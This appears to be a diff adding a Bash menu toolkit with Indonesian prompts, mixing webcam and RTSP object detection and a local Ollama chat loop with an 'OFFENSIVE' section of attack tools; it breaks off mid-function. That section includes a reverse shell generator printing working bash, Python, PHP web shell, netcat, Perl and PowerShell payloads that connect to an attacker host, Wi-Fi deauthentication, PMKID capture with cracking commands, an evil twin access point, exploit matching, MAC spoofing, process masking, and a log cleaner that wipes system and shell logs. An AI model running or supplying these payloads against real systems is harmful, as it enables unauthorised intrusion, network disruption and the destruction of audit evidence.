+  echo "[ AI - WEBCAM PERSON ]"
+  echo "========================="
+
+  init_storage
+  mkdir -p "$storage_path/captures"
+
+  safe_ai 0 "$AI_PYTHON" "$AI_DETECT" 0 "$storage_path/captures" person
+
+  log_save "AI Webcam Person"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_rtsp() {
+  clear
+  echo "========================="
+  echo "[ AI - RTSP ]"
+  echo "========================="
+
+  init_storage
+  read -p "RTSP URL: " rtsp
+
+  mkdir -p "$storage_path/captures"
+
+  safe_ai 0 "$AI_PYTHON" "$AI_DETECT" "$rtsp" "$storage_path/captures" all
+
+  log_save "AI CCTV RTSP"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_image() {
+  clear
+  echo "========================="
+  echo "[ AI - IMAGE ]"
+  echo "========================="
+
+  init_storage
+  read -p "Image path: " img
+
+  mkdir -p "$storage_path/captures"
+
+  safe_ai 120 "$AI_PYTHON" "$AI_DETECT" "$img" "$storage_path/captures" all
+
+  log_save "AI Image Detect"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_video() {
+  clear
+  echo "========================="
+  echo "[ AI - VIDEO ]"
+  echo "========================="
+
+  init_storage
+  read -p "Video path: " vid
+
+  mkdir -p "$storage_path/captures"
+
+  safe_ai 120 "$AI_PYTHON" "$AI_DETECT" "$vid" "$storage_path/captures" all
+
+  log_save "AI Video Detect"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_train() {
+  clear
+  echo "========================="
+  echo "[ AI - TRAIN ]"
+  echo "========================="
+
+  init_storage
+  echo "[~] Mencari data.yaml..."
+
+  mapfile -t files < <(find "$BASE_DIR" -maxdepth 5 -type f -name "data.yaml")
+
+  if [ ${#files[@]} -eq 0 ]; then
+    echo "[!] Tidak ditemukan data.yaml"
+    echo ""
+    read -p "Tekan ENTER untuk kembali"
+    return
+  fi
+
+  for i in "${!files[@]}"; do
+    echo "$i) ${files[$i]}"
+  done
+
+  read -p "Pilih index: " choice
+
+  if [ -z "$choice" ]; then
+    echo "[x] Dibatalkan"
+    return
+  fi
+
+  if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ -z "${files[$choice]}" ]; then
+    echo "[!] Pilihan tidak valid"
+    read -p "Tekan ENTER untuk kembali"
+    return
+  fi
+
+  data="${files[$choice]}"
+
+  read -p "YES untuk training: " confirm
+  [ "$confirm" != "YES" ] && return
+
+  safe_ai 60 "$AI_PYTHON" "$AI_TRAIN" "$data"
+
+  log_save "Custom AI Training"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_run() {
+  clear
+  echo "========================="
+  echo "[ AI - RUN ]"
+  echo "========================="
+
+  init_storage
+  mapfile -t models < <(find "$BASE_DIR" -maxdepth 4 -type f -name "best.pt")
+
+  if [ ${#models[@]} -eq 0 ]; then
+    echo "[!] Tidak ada model"
+    echo ""
+    read -p "Tekan ENTER untuk kembali"
+    return
+  fi
+
+  for i in "${!models[@]}"; do
+    echo "$i) ${models[$i]}"
+  done
+
+  read -p "Model index: " m
+
+  if [ -z "$m" ]; then
+    echo "[x] Dibatalkan"
+    return
+  fi
+
+  if ! [[ "$m" =~ ^[0-9]+$ ]] || [ -z "${models[$m]}" ]; then
+    echo "[!] Pilihan tidak valid"
+    read -p "Tekan ENTER untuk kembali"
+    return
+  fi
+
+  model="${models[$m]}"
+
+  echo "1. Webcam"
+  echo "2. RTSP"
+  read -p "Pilih: " mode
+
+  if [ "$mode" = "2" ]; then
+    read -p "RTSP URL: " src
+  else
+    src=0
+  fi
+
+  safe_ai 60 "$AI_PYTHON" "$AI_DETECT" "$src" "$storage_path/captures" all "$model"
+
+  log_save "Custom AI Run"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+# =========================
+# COMMAND MAP - AI CHAT
+# =========================
+
+cmd_ai_chat_start() {
+
+  if ! command -v ollama >/dev/null 2>&1; then
+    echo "[!] Ollama belum terinstall"
+    return
+  fi
+
+  mkdir -p "$AI_HISTORY_DIR"
+
+  echo ""
+  echo "[~] Installed Models:"
+  ollama list
+
+  echo ""
+  IFS= read -r -p "Model: " model
+
+  [ -z "$model" ] && model="$AI_MODEL_DEFAULT"
+
+  real_model=$(ollama list | awk '{print $1}' | grep "^${model}\(:.*\)\?$" | head -n1)
+
+  if [ -z "$real_model" ]; then
+      echo "[!] Model tidak ditemukan"
+      return
+  fi
+
+  model="$real_model"
+
+  [ -z "$model" ] && return
+
+  SYSTEM_PROMPT="Kamu adalah KECEMBUNG AI Assistant..
+
+  Tugas kamu:
+  - membantu networking
+  - membantu Linux
+  - membantu troubleshooting
+  - menjelaskan hasil scan jaringan
+  - membantu beginner memahami output terminal
+  - menjawab singkat jelas dan teknikal
+
+  Jika ada error:
+  - jelaskan penyebab
+  - beri solusi bertahap
+  - jangan terlalu panjang
+
+  Style:
+  - friendly
+  - teknikal
+  - mudah dipahami beginner
+  "
+
+  session_file="$AI_HISTORY_DIR/chat_$(date +%F_%H-%M-%S).txt"
+
+  echo ""
+  echo "[~] Ketik '/exit' untuk keluar"
+  echo ""
+
+  CHAT_CONTEXT="$SYSTEM_PROMPT"
+
+  while true; do
+
+    echo "$(date +%s)" > "$WATCHDOG_FILE"
+
+    IFS= read -r -p "You> " prompt
+
+    case "$prompt" in
+
+        /clear)
+            CHAT_CONTEXT="$SYSTEM_PROMPT"
+            echo "[✔] Context dibersihkan"
+            continue
+            ;;
+
+        /save)
+            echo "$CHAT_CONTEXT" > "$session_file"
+            echo "[✔] Session disimpan"
+            continue
+            ;;
+
+        /help)
+            echo ""
+            echo "Commands:"
+            echo "/clear  = reset memory"
+            echo "/save   = save session"
+            echo "/help   = bantuan"
+            echo "/exit   = keluar"
+            echo ""
+            continue
+            ;;
+
+        /exit)
+            break
+            ;;
+
+    esac
+
+    [ -z "$prompt" ] && continue
+
+    echo "[USER]" >> "$session_file"
+    echo "$prompt" >> "$session_file"
+    echo "" >> "$session_file"
+
+    FULL_PROMPT="$CHAT_CONTEXT
+
+    USER:
+    $prompt
+
+    AI:
+    "
+
+    echo ""
+    echo "[~] AI thinking..."
+    echo ""
+
+    response=$(printf "%s" "$FULL_PROMPT" | ollama run "$model" 2>/dev/null)
+
+    if [ -z "$response" ]; then
+        response="[!] AI tidak memberikan response"
+    fi
+
+    CHAT_CONTEXT="$FULL_PROMPT$response
+
+    "
+
+    CHAT_CONTEXT=$(printf "%s" "$CHAT_CONTEXT" | tail -c 16000)
+
+    echo ""
+    echo "AI> $response"
+    echo ""
+
+    echo "[AI]" >> "$session_file"
+    echo "$response" >> "$session_file"
+    echo "" >> "$session_file"
+
+  done
+}
+
+cmd_ai_download_model() {
+  clear
+
+  if ! command -v ollama >/dev/null 2>&1; then
+    echo "[!] Ollama belum terinstall"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "========================="
+  echo "  DOWNLOAD AI MODEL"
+  echo "========================="
+  echo ""
+
+  echo "Example Models:"
+  echo "- tinyllama"
+  echo "- phi3"
+  echo "- gemma:2b"
+  echo "- mistral"
+  echo ""
+
+  IFS= read -r -p "Model name: " model
+
+  if [ -z "$model" ]; then
+    echo "[x] Dibatalkan"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo ""
+  echo "[~] Downloading model: $model"
+  echo ""
+
+  log_save "Download AI Model: $model"
+
+  ollama pull "$model"
+
+  if [ $? -eq 0 ]; then
+    echo ""
+    echo "[✔] Model downloaded"
+  else
+    echo ""
+    echo "[!] Failed download model"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ai_list_models() {
+  clear
+
+  if ! command -v ollama >/dev/null 2>&1; then
+    echo "[!] Ollama belum terinstall"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "========================="
+  echo " INSTALLED MODELS"
+  echo "========================="
+  echo ""
+
+  ollama list
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ai_delete_model() {
+  clear
+
+  if ! command -v ollama >/dev/null 2>&1; then
+    echo "[!] Ollama belum terinstall"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "========================="
+  echo "  DELETE AI MODEL"
+  echo "========================="
+  echo ""
+
+  ollama list
+  echo ""
+
+  IFS= read -r -p "Model to delete: " model
+
+  if [ -z "$model" ]; then
+    echo "[x] Dibatalkan"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  IFS= read -r -p "Type YES to confirm: " confirm
+
+  if [ "$confirm" != "YES" ]; then
+    echo "[x] Cancelled"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  log_save "Delete AI Model: $model"
+
+  ollama rm "$model"
+
+  if [ $? -eq 0 ]; then
+    echo ""
+    echo "[✔] Model deleted"
+  else
+    echo ""
+    echo "[!] Failed delete model"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ai_history() {
+  clear
+
+  history_dir="$AI_HISTORY_DIR"
+  mkdir -p "$history_dir"
+
+  shopt -s nullglob
+  mapfile -t files < <(ls -t "$history_dir"/*.txt 2>/dev/null)
+  shopt -u nullglob
+
+  echo "========================="
+  echo "      AI HISTORY"
+  echo "========================="
+  echo ""
+
+  if [ ${#files[@]} -eq 0 ]; then
+    echo "[!] Tidak ada AI history"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  for i in "${!files[@]}"; do
+    echo "$i. $(basename "${files[$i]}")"
+  done
+
+  echo ""
+  IFS= read -r -p "Pilih file: " pilih
+
+  if [ -z "$pilih" ]; then
+    echo "[x] Dibatalkan"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  if ! [[ "$pilih" =~ ^[0-9]+$ ]] || [ -z "${files[$pilih]}" ]; then
+    echo "[!] Invalid selection"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo ""
+  cat "${files[$pilih]}"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ai_status() {
+  clear
+
+  echo "========================="
+  echo "       AI STATUS"
+  echo "========================="
+  echo ""
+
+  if command -v ollama >/dev/null 2>&1; then
+    echo "[✔] Ollama Installed"
+  else
+    echo "[!] Ollama Not Installed"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo ""
+
+  if pgrep ollama >/dev/null 2>&1; then
+    echo "[✔] Ollama Service Running"
+  else
+    echo "[!] Ollama Service Not Running"
+  fi
+
+  echo ""
+  echo "[~] Installed Models:"
+  ollama list
+
+  echo ""
+  echo "[~] Memory Usage:"
+  free -h
+
+  echo ""
+  echo "[~] AI Storage:"
+  du -sh "$HOME/.ollama" 2>/dev/null
+
+  echo ""
+  echo "[~] Default Model:"
+  echo "$AI_MODEL_DEFAULT"
+
+  echo ""
+  echo "[~] AI History Size:"
+  du -sh "$AI_HISTORY_DIR" 2>/dev/null
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ai_clear_history() {
+  clear
+
+  history_dir="$AI_HISTORY_DIR"
+  mkdir -p "$history_dir"
+
+  echo "========================="
+  echo "  CLEAR AI HISTORY"
+  echo "========================="
+  echo ""
+
+  IFS= read -r -p "Type YES to clear history: " confirm
+
+  if [ "$confirm" != "YES" ]; then
+    echo ""
+    echo "[x] Dibatalkan"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  find "$history_dir" -type f -name "*.txt" -delete
+
+  echo ""
+  echo "[✔] AI history cleared"
+  echo ""
+
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+# =========================
+# 🧠 SCENARIO EXECUTION ENGINE
+# =========================
+
+run_command() {
+  local cmd="$1"
+
+  [ -z "$cmd" ] && return 0
+
+  case "$cmd" in
+    cmd_lihat_ip) cmd_lihat_ip ;;
+    cmd_scan_jaringan) cmd_scan_jaringan ;;
+    cmd_ping_ip) cmd_ping_ip ;;
+    cmd_set_ip_manual) cmd_set_ip_manual ;;
+    cmd_routing) cmd_routing ;;
+    cmd_dns_check) cmd_dns_check ;;
+    cmd_internet_check) cmd_internet_check ;;
+    cmd_scan_ssh) cmd_scan_ssh ;;
+    cmd_ssh_connect) cmd_ssh_connect ;;
+    cmd_reset_ip) cmd_reset_ip ;;
+    cmd_arp_watch) cmd_arp_watch ;;
+    cmd_ip_blocklist) cmd_ip_blocklist ;;
+    cmd_conn_monitor) cmd_conn_monitor ;;
+    cmd_dhcp_snooping) cmd_dhcp_snooping ;;
+    cmd_mac_whitelist) cmd_mac_whitelist ;;
+    cmd_tcp_scan_port) cmd_tcp_scan_port ;;
+    cmd_tcp_service_detection) cmd_tcp_service_detection ;;
+    cmd_tcp_range_scan) cmd_tcp_range_scan ;;
+    cmd_tcp_specific_port) cmd_tcp_specific_port ;;
+    cmd_tcp_local_ports) cmd_tcp_local_ports ;;
+    cmd_tcp_banner_grab) cmd_tcp_banner_grab ;;
+    cmd_port_knock_setup) cmd_port_knock_setup ;;
+    cmd_fail2ban_status) cmd_fail2ban_status ;;
+    cmd_syn_flood_detect) cmd_syn_flood_detect ;;
+    cmd_ai_webcam_all) cmd_ai_webcam_all ;;
+    cmd_ai_webcam_person) cmd_ai_webcam_person ;;
+    cmd_ai_rtsp) cmd_ai_rtsp ;;
+    cmd_ai_image) cmd_ai_image ;;
+    cmd_ai_video) cmd_ai_video ;;
+    cmd_ai_train) cmd_ai_train ;;
+    cmd_ai_run) cmd_ai_run ;;
+    cmd_storage_local) cmd_storage_local ;;
+    cmd_storage_usb) cmd_storage_usb ;;
+    cmd_storage_install) cmd_storage_install ;;
+    cmd_storage_save_log) cmd_storage_save_log ;;
+    cmd_usb_detect) cmd_usb_detect ;;
+    cmd_usb_select) cmd_usb_select ;;
+    cmd_usb_workspace) cmd_usb_workspace ;;
+    cmd_usb_read) cmd_usb_read ;;
+    cmd_usb_delete) cmd_usb_delete ;;
+    cmd_log_integrity_check) cmd_log_integrity_check ;;
+    cmd_file_monitor) cmd_file_monitor ;;
+    cmd_auto_report) cmd_auto_report ;;
+    cmd_telegram_exfil) cmd_telegram_exfil ;;
+    cmd_scan_scheduler) cmd_scan_scheduler ;;
+    cmd_nmap_vuln_scan) cmd_nmap_vuln_scan ;;
+    cmd_masscan_aggressive) cmd_masscan_aggressive ;;
+    cmd_reverse_shell_gen) cmd_reverse_shell_gen ;;
+    cmd_wifi_deauth_attack) cmd_wifi_deauth_attack ;;
+    cmd_exploit_autopwn) cmd_exploit_autopwn ;;
+    cmd_mac_changer) cmd_mac_changer ;;
+    cmd_logs_cleaner) cmd_logs_cleaner ;;
+    cmd_torify_session) cmd_torify_session ;;
+    cmd_proc_mask) cmd_proc_mask ;;
+    cmd_wifi_pmkid_attack) cmd_wifi_pmkid_attack ;;
+    cmd_evil_twin_ap) cmd_evil_twin_ap ;;
+    cmd_wps_pixie) cmd_wps_pixie ;;
+    cmd_bluetooth_scan) cmd_bluetooth_scan ;;
+    *)
+      echo "[!] Unknown command: $cmd"
+      return 1
+      ;;
+  esac
+}
+
+# =========================
+# 📦 SCENARIO RUNNER (SAFE)
+# =========================
+
+run_scenario_file() {
+  local file="$1"
+
+  if [ ! -f "$file" ]; then
+    echo "[!] Scenario tidak ditemukan: $file"
+    return 1
+  fi
+
+  echo "[~] Running scenario: $(basename "$file")"
+
+  local line=0
+
+  while IFS= read -r cmd || [ -n "$cmd" ]; do
+    ((line++))
+
+    [ -z "$cmd" ] && continue
+    [[ "$cmd" =~ ^# ]] && continue
+
+    cmd=$(echo "$cmd" | xargs)
+
+    [ -z "$cmd" ] && continue
+
+    echo "[SCENARIO:$line] $cmd"
+
+    run_command "$cmd"
+
+    if [ "$RECOVERY_MODE" -eq 1 ]; then
+      echo "[!] Recovery aktif → stop scenario"
+      break
+    fi
+
+  done < "$file"
+
+  echo "[✔] Scenario selesai"
+  return 0
+}
+
+# =========================
+# OFFENSIVE - OFFENSIVE TOOLS
+# =========================
+
+cmd_nmap_vuln_scan() {
+  clear
+  print_section "NMAP VULN SCAN - CVE HUNTER"
+
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    return
+  fi
+
+  read -p "Target IP/Domain: " target
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  out_file="$storage_path/offensive/nmap_vuln_$(date +%F_%H-%M).txt"
+
+  print_keyval "Target" "$target"
+  print_info "Scanning CVE + vuln scripts... bisa 5-10 menit"
+  echo ""
+
+  nmap -sV --script vuln,exploit,auth -Pn "$target" | tee "$out_file"
+
+  print_success "Hasil disimpan: $out_file"
+  log_save "OFFENSIVE: Nmap Vuln Scan $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_masscan_aggressive() {
+  clear
+  print_section "MASSCAN - AGGRESSIVE PORT BLAST"
+
+  if ! command -v masscan >/dev/null 2>&1; then
+    print_error "masscan belum install. apt install masscan"
+    return
+  fi
+
+  read -p "Target IP/Subnet: " target
+  read -p "Rate paket/detik [10000]: " rate
+  rate=${rate:-10000}
+
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+  if ! [[ "$rate" =~ ^[0-9]+$ ]]; then
+    print_error "Rate harus angka"
+    return
+  fi
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  out_file="$storage_path/offensive/masscan_$(date +%F_%H-%M).txt"
+
+  print_keyval "Target" "$target"
+  print_keyval "Rate" "$rate pps"
+  print_keyval "Ports" "0-65535"
+  print_info "Scanning... CTRL+C untuk stop"
+  echo ""
+
+  sudo masscan -p0-65535 "$target" --rate="$rate" | tee "$out_file"
+
+  print_success "Hasil: $out_file"
+  log_save "OFFENSIVE: Masscan $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_reverse_shell_gen() {
+  clear
+  print_section "REVERSE SHELL GENERATOR"
+
+  echo "1. Bash"
+  echo "2. Python"
+  echo "3. PHP"
+  echo "4. Netcat"
+  echo "5. Perl"
+  echo "6. PowerShell"
+  echo "7. Kembali"
+  echo ""
+  read -p "Pilih jenis shell: " jenis
+
+  [ -z "$jenis" ] && { echo "[x] Dibatalkan"; return; }
+  [ "$jenis" = "7" ] && return
+
+  read -p "LHOST (IP kamu): " lhost
+  read -p "LPORT (port kamu): " lport
+
+  [ -z "$lhost" ] || [ -z "$lport" ] && { print_error "LHOST/LPORT kosong"; return; }
+
+  echo ""
+  print_section "PAYLOAD"
+  echo ""
+
+  case $jenis in
+    1) echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
+    2) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" ;;
+    3) echo "<?php system(\$_GET['cmd']);?>"
+       echo "# Upload ini, akses: http://target/shell.php?cmd=nc%20$lhost%20$lport%20-e%20/bin/bash" ;;
+    4) echo "nc -e /bin/bash $lhost $lport" ;;
+    5) echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
+    6) echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String );\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$c.Close()" ;;
+    *) print_error "Pilihan salah" ;;
+  esac
+
+  echo ""
+  print_section "LISTENER"
+  echo "nc -lvnp $lport"
+  echo ""
+
+  log_save "OFFENSIVE: Generate shell $lhost:$lport"
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_wifi_deauth_attack() {
+  IN_MONITOR_MODE=1
+  clear
+  print_section "WIFI DEAUTH ATTACK"
+
+  if ! command -v aireplay-ng >/dev/null 2>&1; then
+    print_error "aircrack-ng belum install. apt install aircrack-ng"
+    IN_MONITOR_MODE=0
+    return
+  fi
+
+  echo -e "${RED}[!] BUTUH INTERFACE MODE MONITOR${NC}"
+  echo ""
+  read -p "Interface : " iface
+  iface=${iface:-wlan0mon}
+
+  read -p "BSSID target (MAC AP): " bssid
+  [ -z "$bssid" ] && { print_error "BSSID kosong"; IN_MONITOR_MODE=0; return; }
+
+  read -p "Target client MAC [kosong=all]: " client
+  read -p "Jumlah paket [0=infinite]: " count
+  count=${count:-0}
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  log_file="$storage_path/offensive/deauth.log"
+
+  print_keyval "Interface" "$iface"
+  print_keyval "BSSID" "$bssid"
+  print_keyval "Client" "${client:-ALL}"
+  print_keyval "Count" "$count"
+  echo ""
+  print_error "Starting attack... CTRL+C to stop"
+  echo ""
+
+  if [ -z "$client" ]; then
+    aireplay-ng --deauth "$count" -a "$bssid" "$iface" 2>&1 | tee -a "$log_file" &
+  else
+    aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$iface" 2>&1 | tee -a "$log_file" &
+  fi
+
+  CURRENT_CHILD=$!
+  wait "$CURRENT_CHILD" 2>/dev/null
+
+  log_save "OFFENSIVE: Wifi Deauth $bssid"
+  IN_MONITOR_MODE=0
+}
+
+cmd_exploit_autopwn() {
+  clear
+  print_section "EXPLOIT AUTOPWN - SEARCHSPLOIT"
+
+  if ! command -v searchsploit >/dev/null 2>&1; then
+    print_error "searchsploit belum install. apt install exploitdb"
+    return
+  fi
+
+  read -p "Target IP: " target
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  scan_file="$storage_path/offensive/nmap_sv_$target.txt"
+
+  print_info "Step 1: Scanning services..."
+  nmap -sV -Pn "$target" | tee "$scan_file"
+
+  echo ""
+  print_section "EXPLOIT MATCHING"
+  echo ""
+
+  grep -E "^[0-9]+/tcp" "$scan_file" | while read -r line; do
+    port=$(echo "$line" | awk '{print $1}' | cut -d/ -f1)
+    service=$(echo "$line" | awk '{print $3}')
+    version=$(echo "$line" | cut -d' ' -f4-)
+
+    [ -z "$version" ] && continue
+
+    print_keyval "Port $port" "$service $version"
+
+    result=$(searchsploit "$service $version" 2>/dev/null | grep -v "Exploits: No Results")
+
+    if [ -n "$result" ]; then
+      echo -e "${GREEN}[+] EXPLOIT FOUND:${NC}"
+      echo "$result" | head -5
+      echo ""
+    else
+      echo -e "${YELLOW}[-] No exploit${NC}"
+      echo ""
+    fi
+  done
+
+  log_save "OFFENSIVE: Exploit Autopwn $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_mac_changer() {
+  local iface="${1:-}"
+  [ -z "$iface" ] && read -p "Interface : " iface
+  [ -z "$iface" ] && { echo -e "${YELLOW}[x] Dibatalkan${NC}"; return 0; }
+
+  if ! ip link show "$iface" &>/dev/null; then
+    echo -e "${RED}[X] Interface $iface tidak ditemukan${NC}"
+    return 1
+  fi
+
+  local new_mac
+  new_mac="02:$(openssl rand -hex 5 | sed 's/\(..\)/\1:/g; s/:$//')"
+
+  log "OPSEC: MAC Spoofing started on $iface"
+  echo -e "${YELLOW}[~] Spoofing MAC on $iface...${NC}"
+
+  sudo ip link set "$iface" down
+  sudo ip link set "$iface" address "$new_mac"
+  sudo ip link set "$iface" up
+
+  echo -e "${GREEN}[✔] New MAC: $new_mac${NC}"
+  log "OPSEC: MAC changed to $new_mac on $iface"
+}
+
+cmd_logs_cleaner() {
+  echo -e "${RED}[!] WARNING: This will permanently delete system logs${NC}"
+  echo -e "${RED}[!] Only use after authorized pentest is complete${NC}"
+  read -p "Type YES to confirm: " confirm
+  [ "$confirm" != "YES" ] && echo "Cancelled" && return
+
+  log "OPSEC: Starting log cleanup"
+  echo -e "${YELLOW}[~] Cleaning traces...${NC}"
+
+  # Clear shell history
+  history -c && history -w
+  rm -f ~/.bash_history ~/.zsh_history 2>/dev/null
+
+  # Clear system logs - butuh sudo
+  sudo truncate -s 0 /var/log/auth.log 2>/dev/null
+  sudo truncate -s 0 /var/log/syslog 2>/dev/null
+  sudo truncate -s 0 /var/log/wtmp 2>/dev/null
+  sudo truncate -s 0 /var/log/btmp 2>/dev/null
+  sudo truncate -s 0 /var/log/lastlog 2>/dev/null
+
+  # Clear kecembung logs kecuali session ini
+  echo "[$(date)] OPSEC: Manual log cleanup executed" > "$LOG_DIR/kecembung_log.txt"
+
+  echo -e "${GREEN}[✔] Logs cleaned${NC}"
+  log "OPSEC: Log cleanup complete"
+}
+
+cmd_torify_session() {
+  if ! command -v tor >/dev/null 2>&1; then
+    echo -e "${RED}[X] Tor not installed. Install: sudo apt install tor${NC}"
+    return 1
+  fi
+
+  log "OPSEC: Starting Tor service"
+  echo -e "${YELLOW}[~] Starting Tor...${NC}"
+  sudo systemctl start tor
+
+  if systemctl is-active --quiet tor; then
+    echo -e "${GREEN}[✔] Tor active on 127.0.0.1:9050${NC}"
+    echo -e "${CYAN}Usage: torify nmap -sT -Pn target.com${NC}"
+    echo -e "${CYAN}Usage: torify curl ifconfig.me${NC}"
+    log "OPSEC: Tor service started successfully"
+  else
+    echo -e "${RED}[X] Failed to start Tor${NC}"
+  fi
+}
+
+cmd_proc_mask() {
+  local new_name="${1:-}"
+  [ -z "$new_name" ] && read -p "New process name [systemd-worker]: " new_name
+  new_name="${new_name:-systemd-worker}"
+
+  echo -e "${YELLOW}[~] Process Masking Info${NC}"
+  echo -e "${CYAN}Run kecembung with masked name:${NC}"
+  echo -e "${GREEN}exec -a '$new_name' ./kecembung${NC}"
+  echo ""
+  echo -e "${CYAN}For nmap:${NC}"
+  echo -e "${GREEN}exec -a '$new_name' nmap -sS target${NC}"
+  echo ""
+  echo -e "${YELLOW}[!] Note: This only works when launching from shell${NC}"
+  log "OPSEC: Process mask suggested: $new_name"
+}
+
+cmd_wifi_pmkid_attack() {
+  IN_MONITOR_MODE=1
+  local iface="${1:-}"
+  [ -z "$iface" ] && read -p "Interface monitor mode : " iface
+  iface="${iface:-wlan0mon}"
+
+  if ! command -v hcxdumptool >/dev/null 2>&1; then
+    echo -e "${RED}[X] hcxdumptool not found. Install: sudo apt install hcxtools${NC}"
+    IN_MONITOR_MODE=0
+    return 1
+  fi
+
+  local timestamp=$(date +%Y%m%d_%H%M%S)
+  local outfile="$LOOT_DIR/wifi_pmkid_${timestamp}.pcapng"
+  mkdir -p "$LOOT_DIR"
+
+  log "WIFI: PMKID attack started on $iface"
+  echo -e "${YELLOW}[~] Capturing PMKID... Press Ctrl+C to stop${NC}"
+  echo -e "${CYAN}Output: $outfile${NC}"
+
+  sudo hcxdumptool -i "$iface" -o "$outfile" --enable_status=1 &
+
+  CURRENT_CHILD=$!
+  wait "$CURRENT_CHILD" 2>/dev/null
+
+  echo -e "${GREEN}[✔] Saved: $outfile${NC}"
+  echo -e "${CYAN}To crack: hcxpcapngtool -o hash.txt $outfile${NC}"
+  echo -e "${CYAN}Then: hashcat -m 22000 hash.txt rockyou.txt${NC}"
+  log "WIFI: PMKID capture saved to $outfile"
+  IN_MONITOR_MODE=0
+}
+
+cmd_evil_twin_ap() {
+  local iface="${1:-}"
+  local ssid="${2:-}"
+  [ -z "$iface" ] && read -p "Interface : " iface
+  [ -z "$ssid" ] && read -p "Fake SSID to clone: " ssid
+
+  if ! command -v hostapd >/dev/null 2>&1; then
+    echo -e "${RED}[X] hostapd not found. Install: sudo apt install hostapd dnsmasq${NC}"
+    return 1
+  fi
+
+  log "WIFI: Evil Twin AP started for SSID: $ssid"
+  echo -e "${RED}[!] WARNING: Only use on authorized networks${NC}"
+  echo -e "${YELLOW}[~] Setting up fake AP: $ssid${NC}"
+
+  local conf_dir="$HOME/.kecembung/sessions/eviltwin"
+  mkdir -p "$conf_dir"
+
+  cat > "$conf_dir/hostapd.conf" << EOF
+interface=$iface
+driver=nl80211
+ssid=$ssid
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+  echo -e "${GREEN}[✔] Config created: $conf_dir/hostapd.conf${NC}"
+  echo -e "${CYAN}Manual start: sudo hostapd $conf_dir/hostapd.conf${NC}"
+  echo -e "${YELLOW}[!] You need dnsmasq + apache for full captive portal${NC}"
+  log "WIFI: Evil Twin config generated for $ssid"
+}
+
+cmd_wps_pixie() {
+  local iface="${1:-}"
+  local bssid="${2:-}"
+  [ -z "$iface" ] && read -p "Interface monitor : " iface
+  [ -z "$bssid" ] && read -p "Target BSSID: " bssid
+
+  if ! command -v reaver >/dev/null 2>&1; then
+    echo -e "${RED}[X] reaver not found. Install: sudo apt install reaver${NC}"
+    return 1
+  fi
+
+  mkdir -p "$LOOT_DIR"
+  local timestamp=$(date +%Y%m%d_%H%M%S)
+  local outfile="$LOOT_DIR/wps_pixie_${bssid//:/}_${timestamp}.txt"
+
+  log "WIFI: WPS Pixie attack on $bssid"
+  echo -e "${YELLOW}[~] Running Pixiedust attack...${NC}"
